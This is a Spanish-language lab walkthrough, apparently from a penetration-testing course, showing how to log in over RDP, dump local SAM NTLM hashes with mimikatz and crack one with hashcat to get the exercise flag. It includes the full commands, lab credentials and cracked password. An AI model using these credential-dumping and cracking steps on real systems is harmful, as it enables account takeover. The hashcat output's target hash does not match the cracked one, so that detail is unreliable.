# Walk: Password Attacks - Cracking NTLM - VM #1

## Fecha: 24/02/2025
## Host: Windows
## IP: 192.168.155.227
## Objetivo
Access VM #2 via RDP as user _nadine_ with the password retrieved in the exercise of the section labeled "Password Manager" and leverage the methods from this section to extract Steve's NTLM hash. Use **best64.rule** for the cracking process and enter the plain text password as answer to this exercise.
## Herramientas
1.  xfreerdp
2.  hashcat
3.  mimikatz
## Procedimiento y comandos
#### Paso 1: Obtenemos el hash ntml de steve
1. Accedemos como _nadine_ para obtener el hash ntml de _steve_
`xfreerdp /v:192.168.155.227 /u:nadine /p:123abc +clipboard /cert:ignore /drive:/tmp`
2. Ejecutamos _**mimikatz**_ para obtener el hash de _steve_
> `cd C:\tools`
> `PS C:\tools> .\mimikatz.exe`
```
mimikatz #  privilege::debug
Privilege '20' OK
mimikatz #  token::elevate
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM
656 {0;000003e7} 1 D 34811 NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Primary
-> Impersonated !
* Process Token : {0;000413a0} 1 F 6146616 MARKETINGWK01\offsec S-1-5-21-4264639230-2296035194-3358247000-1001 (14g,24p) Primary
* Thread Token : {0;000003e7} 1 D 6217216 NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Impersonation (Delegation)
mimikatz #  lsadump::sam
```
3. Obtenemos el hash elevando nuestros privilegios a **System**
	
	-   `privilege::debug` habilitamos _**SeDebugPrivilege**_ para poder ejecutar el resto de los comandos.
	-   `token::elevate` eleva nuestros privilegios a _system_ para poder obtener el hash.
	-   `lsadump::sam` extrae las passwords de SAM.

```
mimikatz #  privilege::debug
Privilege '20' OK
mimikatz #  token::elevate
Token Id : 0
User name :
SID name : NT AUTHORITY\SYSTEM
656 {0;000003e7} 1 D 34811 NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Primary
-> Impersonated !
* Process Token : {0;000413a0} 1 F 6146616 MARKETINGWK01\offsec S-1-5-21-4264639230-2296035194-3358247000-1001 (14g,24p) Primary
* Thread Token : {0;000003e7} 1 D 6217216 NT AUTHORITY\SYSTEM S-1-5-18 (04g,21p) Impersonation (Delegation)
mimikatz #  lsadump::sam
Domain : MARKETINGWK01
SysKey : 2a0e15573f9ce6cdd6a1c62d222035d5
Local SID : S-1-5-21-4264639230-2296035194-3358247000
RID : 000003e9 (1001)
User : offsec
Hash NTLM: 2892d26cdf84d7a70e2eb3b9f05c425e
RID : 000003ea (1002)
User : steve
Hash NTLM: 2835573fb334e3696ef62a00e5cf7571
...
```
#### Paso 2: Crackeamos el hash
-   Una vez obtenido el hash _**2835573fb334e3696ef62a00e5cf7571**_ procedemos a crackearlo en kali.

1.  Guardamos el hash: `echo "2835573fb334e3696ef62a00e5cf7571" > steve.hash`
2.  Averiguamos el modo: `hashcat -h | grep "ntlm"`

```
   5500 | NetNTLMv1 / NetNTLMv1+ESS                                  | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                             | Network Protocol
   5600 | NetNTLMv2                                                  | Network Protocol
  27100 | NetNTLMv2 (NT)                                             | Network Protocol
   1000 | NTLM                                                       | Operating System

```

3.  Ejecutamos **hashcat** para crackear el hash: `hashcat -m 1000 steve.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`

```
Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 1104517645

2835573fb334e3696ef62a00e5cf7571:francesca77                   
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1000 (NTLM)
Hash.Target......: 3ae8e5f0ffabb3a627672e1600f1ba10
Time.Started.....: Mon Feb 24 13:22:39 2025, (1 sec)
Time.Estimated...: Mon Feb 24 13:22:40 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3814.9 kH/s (6.06ms) @ Accel:128 Loops:77 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 78848/1104517645 (0.01%)
Rejected.........: 0/78848 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-77 Iteration:0-77
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> bnybny
Hardware.Mon.#1..: Temp: 61c Util: 14%

```
>Nuestro flag es  _**francesca77**_

